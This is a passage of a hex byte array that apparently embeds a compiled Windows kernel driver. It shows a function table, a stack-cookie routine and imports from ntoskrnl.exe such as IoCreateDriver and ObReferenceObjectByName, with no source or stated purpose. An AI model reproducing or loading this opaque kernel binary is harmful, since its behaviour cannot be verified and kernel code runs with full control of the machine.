	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x11, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x50, 0x11, 0x00, 0x00, 0x9D, 0x12, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0xA0, 0x12, 0x00, 0x00, 0xED, 0x13, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0xF0, 0x13, 0x00, 0x00, 0x3D, 0x15, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x40, 0x15, 0x00, 0x00, 0x8D, 0x16, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x90, 0x16, 0x00, 0x00, 0xDD, 0x17, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0xE0, 0x17, 0x00, 0x00, 0x2D, 0x19, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x30, 0x19, 0x00, 0x00, 0x7D, 0x1A, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x80, 0x1A, 0x00, 0x00, 0xCD, 0x1B, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0xD0, 0x1B, 0x00, 0x00, 0x1D, 0x1D, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x20, 0x1D, 0x00, 0x00, 0x6D, 0x1E, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x70, 0x1E, 0x00, 0x00, 0xBD, 0x1F, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0xC0, 0x1F, 0x00, 0x00, 0x0D, 0x21, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x10, 0x21, 0x00, 0x00, 0x5D, 0x22, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x60, 0x22, 0x00, 0x00, 0xAD, 0x23, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0xB0, 0x23, 0x00, 0x00, 0xFD, 0x24, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x00, 0x25, 0x00, 0x00, 0x4D, 0x26, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x50, 0x26, 0x00, 0x00, 0x9D, 0x27, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0xA0, 0x27, 0x00, 0x00, 0xED, 0x28, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0xF0, 0x28, 0x00, 0x00, 0x3D, 0x2A, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x40, 0x2A, 0x00, 0x00, 0x8D, 0x2B, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x90, 0x2B, 0x00, 0x00, 0xDD, 0x2C, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0xE0, 0x2C, 0x00, 0x00, 0x2D, 0x2E, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x30, 0x2E, 0x00, 0x00, 0x7D, 0x2F, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x80, 0x2F, 0x00, 0x00, 0xCD, 0x30, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0xD0, 0x30, 0x00, 0x00, 0x1D, 0x32, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x20, 0x32, 0x00, 0x00, 0x6D, 0x33, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x70, 0x33, 0x00, 0x00, 0xBD, 0x34, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0xC0, 0x34, 0x00, 0x00, 0x0D, 0x36, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x10, 0x36, 0x00, 0x00, 0x5D, 0x37, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x60, 0x37, 0x00, 0x00, 0xAD, 0x38, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0xB0, 0x38, 0x00, 0x00, 0xFD, 0x39, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x00, 0x3A, 0x00, 0x00, 0x4D, 0x3B, 0x00, 0x00,
	0x20, 0xCB, 0x00, 0x00, 0x50, 0x3B, 0x00, 0x00, 0x76, 0x3B, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x80, 0x3B, 0x00, 0x00, 0xA6, 0x3B, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xB0, 0x3B, 0x00, 0x00, 0xD6, 0x3B, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xE0, 0x3B, 0x00, 0x00, 0x06, 0x3C, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x10, 0x3C, 0x00, 0x00, 0x36, 0x3C, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x40, 0x3C, 0x00, 0x00, 0x66, 0x3C, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x70, 0x3C, 0x00, 0x00, 0x96, 0x3C, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xA0, 0x3C, 0x00, 0x00, 0xC6, 0x3C, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xD0, 0x3C, 0x00, 0x00, 0xF6, 0x3C, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x00, 0x3D, 0x00, 0x00, 0x26, 0x3D, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x30, 0x3D, 0x00, 0x00, 0x56, 0x3D, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x60, 0x3D, 0x00, 0x00, 0x86, 0x3D, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x90, 0x3D, 0x00, 0x00, 0xB6, 0x3D, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xC0, 0x3D, 0x00, 0x00, 0xE6, 0x3D, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xF0, 0x3D, 0x00, 0x00, 0x16, 0x3E, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x20, 0x3E, 0x00, 0x00, 0x46, 0x3E, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x50, 0x3E, 0x00, 0x00, 0x76, 0x3E, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x80, 0x3E, 0x00, 0x00, 0xA6, 0x3E, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xB0, 0x3E, 0x00, 0x00, 0xD6, 0x3E, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xE0, 0x3E, 0x00, 0x00, 0x06, 0x3F, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x10, 0x3F, 0x00, 0x00, 0x36, 0x3F, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x40, 0x3F, 0x00, 0x00, 0x66, 0x3F, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x70, 0x3F, 0x00, 0x00, 0x96, 0x3F, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xA0, 0x3F, 0x00, 0x00, 0xC6, 0x3F, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xD0, 0x3F, 0x00, 0x00, 0xF6, 0x3F, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x26, 0x40, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x30, 0x40, 0x00, 0x00, 0x56, 0x40, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x60, 0x40, 0x00, 0x00, 0x86, 0x40, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x90, 0x40, 0x00, 0x00, 0xB6, 0x40, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xC0, 0x40, 0x00, 0x00, 0xE6, 0x40, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xF0, 0x40, 0x00, 0x00, 0x16, 0x41, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x20, 0x41, 0x00, 0x00, 0x46, 0x41, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x50, 0x41, 0x00, 0x00, 0x76, 0x41, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x80, 0x41, 0x00, 0x00, 0xFA, 0x41, 0x00, 0x00,
	0xB4, 0xC7, 0x00, 0x00, 0x30, 0x42, 0x00, 0x00, 0x78, 0x44, 0x00, 0x00,
	0xB4, 0xC9, 0x00, 0x00, 0x80, 0x44, 0x00, 0x00, 0xC7, 0x45, 0x00, 0x00,
	0xA8, 0xC9, 0x00, 0x00, 0xD0, 0x45, 0x00, 0x00, 0xF8, 0x46, 0x00, 0x00,
	0x7C, 0xCA, 0x00, 0x00, 0x80, 0x47, 0x00, 0x00, 0x01, 0x4B, 0x00, 0x00,
	0x18, 0xCA, 0x00, 0x00, 0x10, 0x4B, 0x00, 0x00, 0x30, 0x4E, 0x00, 0x00,
	0x08, 0xCA, 0x00, 0x00, 0x30, 0x4E, 0x00, 0x00, 0x18, 0x4F, 0x00, 0x00,
	0xE4, 0xC9, 0x00, 0x00, 0x20, 0x4F, 0x00, 0x00, 0xBF, 0x51, 0x00, 0x00,
	0xCC, 0xC9, 0x00, 0x00, 0xC0, 0x51, 0x00, 0x00, 0x9A, 0x53, 0x00, 0x00,
	0x28, 0xCA, 0x00, 0x00, 0xA0, 0x53, 0x00, 0x00, 0xD7, 0x53, 0x00, 0x00,
	0x58, 0xC8, 0x00, 0x00, 0xE0, 0x53, 0x00, 0x00, 0x11, 0x57, 0x00, 0x00,
	0x10, 0xCB, 0x00, 0x00, 0x20, 0x57, 0x00, 0x00, 0x37, 0x57, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x40, 0x57, 0x00, 0x00, 0x16, 0x59, 0x00, 0x00,
	0xF8, 0xC8, 0x00, 0x00, 0x20, 0x59, 0x00, 0x00, 0x41, 0x5C, 0x00, 0x00,
	0x20, 0xC9, 0x00, 0x00, 0x50, 0x5C, 0x00, 0x00, 0xF7, 0x5C, 0x00, 0x00,
	0x48, 0xC9, 0x00, 0x00, 0x00, 0x5D, 0x00, 0x00, 0x08, 0x5E, 0x00, 0x00,
	0xEC, 0xC7, 0x00, 0x00, 0x10, 0x5E, 0x00, 0x00, 0xE5, 0x5E, 0x00, 0x00,
	0xEC, 0xC8, 0x00, 0x00, 0xF0, 0x5E, 0x00, 0x00, 0x60, 0x60, 0x00, 0x00,
	0xE0, 0xC7, 0x00, 0x00, 0x60, 0x60, 0x00, 0x00, 0xEC, 0x61, 0x00, 0x00,
	0xD4, 0xC7, 0x00, 0x00, 0xF0, 0x61, 0x00, 0x00, 0x00, 0x65, 0x00, 0x00,
	0x84, 0xC9, 0x00, 0x00, 0x00, 0x65, 0x00, 0x00, 0xF4, 0x66, 0x00, 0x00,
	0x30, 0xC9, 0x00, 0x00, 0x00, 0x67, 0x00, 0x00, 0x65, 0x67, 0x00, 0x00,
	0x60, 0xC9, 0x00, 0x00, 0x70, 0x67, 0x00, 0x00, 0xD8, 0x67, 0x00, 0x00,
	0x60, 0xC9, 0x00, 0x00, 0xE0, 0x67, 0x00, 0x00, 0x57, 0x68, 0x00, 0x00,
	0x3C, 0xC9, 0x00, 0x00, 0x60, 0x68, 0x00, 0x00, 0x4C, 0x6B, 0x00, 0x00,
	0x70, 0xCA, 0x00, 0x00, 0x50, 0x6B, 0x00, 0x00, 0xA5, 0x6B, 0x00, 0x00,
	0x6C, 0xC9, 0x00, 0x00, 0xF0, 0x6B, 0x00, 0x00, 0xAD, 0x6C, 0x00, 0x00,
	0x28, 0xC8, 0x00, 0x00, 0xB0, 0x6C, 0x00, 0x00, 0x91, 0x6D, 0x00, 0x00,
	0xF8, 0xC7, 0x00, 0x00, 0xA0, 0x6D, 0x00, 0x00, 0x0E, 0x6E, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x10, 0x6E, 0x00, 0x00, 0xCE, 0x6F, 0x00, 0x00,
	0xC0, 0xC9, 0x00, 0x00, 0xD0, 0x6F, 0x00, 0x00, 0xAB, 0x73, 0x00, 0x00,
	0xA0, 0xCA, 0x00, 0x00, 0xB0, 0x73, 0x00, 0x00, 0xB0, 0x74, 0x00, 0x00,
	0x5C, 0xCA, 0x00, 0x00, 0xB0, 0x74, 0x00, 0x00, 0x3B, 0x75, 0x00, 0x00,
	0x78, 0xC9, 0x00, 0x00, 0x40, 0x75, 0x00, 0x00, 0xA9, 0x75, 0x00, 0x00,
	0xBC, 0xC8, 0x00, 0x00, 0xB0, 0x75, 0x00, 0x00, 0x1F, 0x76, 0x00, 0x00,
	0x7C, 0xC8, 0x00, 0x00, 0x20, 0x76, 0x00, 0x00, 0x70, 0x76, 0x00, 0x00,
	0x54, 0xC9, 0x00, 0x00, 0x70, 0x76, 0x00, 0x00, 0x12, 0x77, 0x00, 0x00,
	0x58, 0xC8, 0x00, 0x00, 0x20, 0x77, 0x00, 0x00, 0xF7, 0x79, 0x00, 0x00,
	0xC8, 0xC8, 0x00, 0x00, 0x00, 0x7A, 0x00, 0x00, 0x7C, 0x7A, 0x00, 0x00,
	0xA8, 0xC7, 0x00, 0x00, 0x80, 0x7A, 0x00, 0x00, 0xB4, 0x7A, 0x00, 0x00,
	0xC4, 0xCA, 0x00, 0x00, 0xC0, 0x7A, 0x00, 0x00, 0xF3, 0x7A, 0x00, 0x00,
	0x6C, 0xC9, 0x00, 0x00, 0x00, 0x7B, 0x00, 0x00, 0xB5, 0x7C, 0x00, 0x00,
	0x88, 0xC8, 0x00, 0x00, 0xC0, 0x7C, 0x00, 0x00, 0x8C, 0x7D, 0x00, 0x00,
	0xC0, 0xC7, 0x00, 0x00, 0x90, 0x7D, 0x00, 0x00, 0x91, 0x7F, 0x00, 0x00,
	0x90, 0xC9, 0x00, 0x00, 0xA0, 0x7F, 0x00, 0x00, 0xBA, 0x80, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x80, 0x82, 0x00, 0x00, 0xBB, 0x82, 0x00, 0x00,
	0x04, 0xCB, 0x00, 0x00, 0xC0, 0x82, 0x00, 0x00, 0x03, 0x83, 0x00, 0x00,
	0x04, 0xCB, 0x00, 0x00, 0x40, 0x84, 0x00, 0x00, 0x89, 0x85, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x90, 0x85, 0x00, 0x00, 0xBE, 0x86, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xC0, 0x86, 0x00, 0x00, 0x95, 0x87, 0x00, 0x00,
	0x04, 0xCB, 0x00, 0x00, 0xA0, 0x87, 0x00, 0x00, 0xE2, 0x88, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x70, 0x89, 0x00, 0x00, 0x39, 0x8A, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xA0, 0x8A, 0x00, 0x00, 0x09, 0x8B, 0x00, 0x00,
	0x04, 0xCB, 0x00, 0x00, 0x10, 0x8B, 0x00, 0x00, 0xEB, 0x8B, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0xF0, 0x8B, 0x00, 0x00, 0x3E, 0x8D, 0x00, 0x00,
	0x6C, 0xC9, 0x00, 0x00, 0x40, 0x8D, 0x00, 0x00, 0x48, 0x8E, 0x00, 0x00,
	0x70, 0xC8, 0x00, 0x00, 0x50, 0x8E, 0x00, 0x00, 0x94, 0x8F, 0x00, 0x00,
	0x6C, 0xC9, 0x00, 0x00, 0xA0, 0x8F, 0x00, 0x00, 0x39, 0x92, 0x00, 0x00,
	0xD0, 0xCA, 0x00, 0x00, 0x40, 0x92, 0x00, 0x00, 0x0F, 0x93, 0x00, 0x00,
	0xA8, 0xC7, 0x00, 0x00, 0x10, 0x93, 0x00, 0x00, 0x06, 0x94, 0x00, 0x00,
	0x4C, 0xC8, 0x00, 0x00, 0x10, 0x94, 0x00, 0x00, 0x1D, 0x96, 0x00, 0x00,
	0x64, 0xC8, 0x00, 0x00, 0x94, 0x96, 0x00, 0x00, 0xD2, 0x96, 0x00, 0x00,
	0x34, 0xCB, 0x00, 0x00, 0xD4, 0x96, 0x00, 0x00, 0xF6, 0x96, 0x00, 0x00,
	0x34, 0xCB, 0x00, 0x00, 0x8C, 0x97, 0x00, 0x00, 0xE3, 0x97, 0x00, 0x00,
	0x34, 0xCB, 0x00, 0x00, 0xA0, 0x98, 0x00, 0x00, 0xBE, 0x98, 0x00, 0x00,
	0x34, 0xCB, 0x00, 0x00, 0xC0, 0x98, 0x00, 0x00, 0x20, 0x99, 0x00, 0x00,
	0x34, 0xCB, 0x00, 0x00, 0x20, 0x99, 0x00, 0x00, 0xA6, 0x99, 0x00, 0x00,
	0x6C, 0xCB, 0x00, 0x00, 0xB0, 0x99, 0x00, 0x00, 0x65, 0x9A, 0x00, 0x00,
	0x88, 0xCB, 0x00, 0x00, 0x80, 0x9A, 0x00, 0x00, 0x9E, 0x9A, 0x00, 0x00,
	0x30, 0xCB, 0x00, 0x00, 0xB0, 0x9A, 0x00, 0x00, 0xB5, 0x9A, 0x00, 0x00,
	0x40, 0xCB, 0x00, 0x00, 0xD0, 0x9A, 0x00, 0x00, 0xD6, 0x9A, 0x00, 0x00,
	0x40, 0xCB, 0x00, 0x00, 0x10, 0x9B, 0x00, 0x00, 0xD7, 0x9B, 0x00, 0x00,
	0x40, 0xCB, 0x00, 0x00, 0x00, 0x9C, 0x00, 0x00, 0xAA, 0x9E, 0x00, 0x00,
	0x40, 0xCB, 0x00, 0x00, 0xC0, 0x9E, 0x00, 0x00, 0xC7, 0x9F, 0x00, 0x00,
	0x40, 0xCB, 0x00, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x43, 0xA0, 0x00, 0x00,
	0x48, 0xCB, 0x00, 0x00, 0x80, 0xA0, 0x00, 0x00, 0xA6, 0xA0, 0x00, 0x00,
	0x58, 0xCB, 0x00, 0x00, 0xB0, 0xB3, 0x00, 0x00, 0xC5, 0xB3, 0x00, 0x00,
	0x1C, 0xC8, 0x00, 0x00, 0xD0, 0xB3, 0x00, 0x00, 0xE5, 0xB3, 0x00, 0x00,
	0x1C, 0xC8, 0x00, 0x00, 0xE5, 0xB3, 0x00, 0x00, 0xFA, 0xB3, 0x00, 0x00,
	0x1C, 0xC8, 0x00, 0x00, 0x00, 0xB4, 0x00, 0x00, 0x15, 0xB4, 0x00, 0x00,
	0xF8, 0xCA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x05, 0x89, 0xC0, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x1B,
	0x48, 0xB9, 0x32, 0xA2, 0xDF, 0x2D, 0x99, 0x2B, 0x00, 0x00, 0x48, 0x3B,
	0xC1, 0x74, 0x0C, 0x48, 0xF7, 0xD0, 0x48, 0x89, 0x05, 0x73, 0xC0, 0xFF,
	0xFF, 0xC3, 0xCC, 0xB9, 0x06, 0x00, 0x00, 0x00, 0xCD, 0x29, 0xCC, 0xCC,
	0x58, 0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xF4, 0x11, 0x01, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xD8, 0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xE2, 0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEC, 0x10, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xF6, 0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0E, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1C, 0x11, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x2A, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x58, 0x11, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x70, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x84, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9E, 0x11, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xB0, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC8, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0xDE, 0x11, 0x01, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xEF, 0x0C, 0x73, 0x74, 0x72, 0x73, 0x74, 0x72, 0x00, 0x00, 0x04, 0x0D,
	0x77, 0x63, 0x73, 0x6C, 0x65, 0x6E, 0x00, 0x00, 0x0D, 0x0D, 0x77, 0x63,
	0x73, 0x73, 0x74, 0x72, 0x00, 0x00, 0x3A, 0x09, 0x52, 0x74, 0x6C, 0x49,
	0x6E, 0x69, 0x74, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74,
	0x72, 0x69, 0x6E, 0x67, 0x00, 0x00, 0x1A, 0x05, 0x4B, 0x65, 0x4C, 0x6F,
	0x77, 0x65, 0x72, 0x49, 0x72, 0x71, 0x6C, 0x00, 0xB6, 0x05, 0x4B, 0x66,
	0x52, 0x61, 0x69, 0x73, 0x65, 0x49, 0x72, 0x71, 0x6C, 0x00, 0x76, 0x04,
	0x49, 0x6F, 0x66, 0x43, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74, 0x65, 0x52,
	0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x00, 0x00, 0x50, 0x03, 0x49, 0x6F,
	0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x53, 0x79, 0x6D, 0x62, 0x6F, 0x6C,
	0x69, 0x63, 0x4C, 0x69, 0x6E, 0x6B, 0x00, 0x00, 0xFB, 0x06, 0x4F, 0x62,
	0x66, 0x44, 0x65, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E, 0x63, 0x65,
	0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0x00, 0x0E, 0x06, 0x4D, 0x6D,
	0x49, 0x73, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x56, 0x61, 0x6C,
	0x69, 0x64, 0x00, 0x00, 0xED, 0x06, 0x4F, 0x62, 0x52, 0x65, 0x66, 0x65,
	0x72, 0x65, 0x6E, 0x63, 0x65, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x42,
	0x79, 0x4E, 0x61, 0x6D, 0x65, 0x00, 0x46, 0x03, 0x49, 0x6F, 0x43, 0x72,
	0x65, 0x61, 0x74, 0x65, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x00, 0x00,
	0x51, 0x0C, 0x5F, 0x5F, 0x43, 0x5F, 0x73, 0x70, 0x65, 0x63, 0x69, 0x66,
	0x69, 0x63, 0x5F, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x00, 0x00,
	0x55, 0x06, 0x4D, 0x6D, 0x55, 0x73, 0x65, 0x72, 0x50, 0x72, 0x6F, 0x62,
	0x65, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x00, 0x66, 0x03,
	0x49, 0x6F, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x4F, 0x62, 0x6A, 0x65,
	0x63, 0x74, 0x54, 0x79, 0x70, 0x65, 0x00, 0x00, 0x6E, 0x74, 0x6F, 0x73,
	0x6B, 0x72, 0x6E, 0x6C, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
